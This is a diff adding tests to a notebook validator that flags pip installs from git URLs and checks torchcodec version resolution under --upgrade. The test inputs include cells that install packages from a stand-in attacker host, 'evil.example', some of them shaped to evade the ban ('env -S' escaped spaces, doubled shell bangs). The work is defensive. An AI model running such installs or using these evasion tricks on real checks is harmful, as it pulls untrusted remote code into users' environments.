@@ -2998,3 +2998,87 @@ def test_a_case_arm_does_not_close_a_substitution():
     assert nv._substitution_bodies("echo $(pip install a) tail") == ["pip install a"]
     assert nv._substitution_bodies('echo $(pip install "a)b")') == ['pip install "a)b"']
     assert nv._substitution_bodies("echo $(pip install $(cat x)) tail") == ["pip install $(cat x)"]
+
+
+def test_env_split_string_reads_the_escaped_space():
+    """GNU env documents `\\_` inside an `-S` operand as a space, and it really separates.
+
+    Verified with coreutils 9.4: `env -S 'printf [%s][%s] a\\_b'` prints `[a][b]`, exactly as
+    a plain space does. bash keeps that backslash inside double quotes, so unescaping the
+    operand as an ordinary shell word rebuilt `pip install_git+...` and saw no install.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        '!env -S "pip install\\_git+https://evil.example/pkg.git"',
+        "!env -S'pip install\\_git+https://evil.example/pkg.git'",
+        '!env --split-string="pip install\\_git+https://evil.example/pkg.git"',
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # A plain space in the same place is still read the same way.
+    assert nv._strip_exec_prefixes('env -S "pip install git+https://x/e.git"') == (
+        "pip install git+https://x/e.git",
+        True,
+    )
+    # The escape belongs to the OPERAND. A trailing argument is bash's to unescape, and
+    # `a\\_b` is one package there rather than two.
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations('!env -S "pip install" a\\_b')
+    ] == [("install", ["a_b"])]
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations('!env -S "pip install\\_torchao"')
+    ] == [("install", ["torchao"])]
+
+
+def test_an_upgrade_forgets_a_version_it_cannot_place():
+    """`--upgrade` moves to the newest available release, so the installed one is not it.
+
+    A ceiling with no floor under it names no landing either, and keeping the stale version
+    raised a false R-INST-004 about a release the cell replaces.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
+    environment = nv._marker_environment(colab)
+
+    ceiling_only = '!pip install --upgrade "torchcodec<0.12"'
+    assert nv._effective_version(ceiling_only, "torchcodec", colab["torchcodec"], environment) == (
+        None,
+        True,
+    )
+    assert nv.rule_inst_004_torchcodec_torch(ceiling_only, colab, "nb.ipynb", 0) == []
+    # Without --upgrade a version that already satisfies the ceiling is kept.
+    assert nv._effective_version(
+        '!pip install "torchcodec<0.12"', "torchcodec", colab["torchcodec"], environment
+    ) == ("0.10.0+cu128", True)
+    # A bounded window still names where it lands.
+    assert nv._effective_version(
+        '!pip install --upgrade "torchcodec>=0.10,<0.12"',
+        "torchcodec",
+        colab["torchcodec"],
+        environment,
+    ) == ("0.11", True)
+
+
+def test_a_shell_negation_before_pip_is_still_pip():
+    """bash's `!` reserved word runs the pipeline and inverts its exit status.
+
+    After the IPython escape is stripped, `! ! pip install git+...` still installs, but
+    requiring exactly one leading bang matched nothing and the git+ ban was bypassed.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "! ! pip install git+https://evil.example/pkg.git",
+        "!! pip install git+https://evil.example/pkg.git",
+        "!!pip install git+https://evil.example/pkg.git",
+        "!pip install git+https://evil.example/pkg.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # A bang in front of something that is not pip is still not an install.
+    assert nv.PIP_LINE_RE.match("! ! echo pip install x") is None
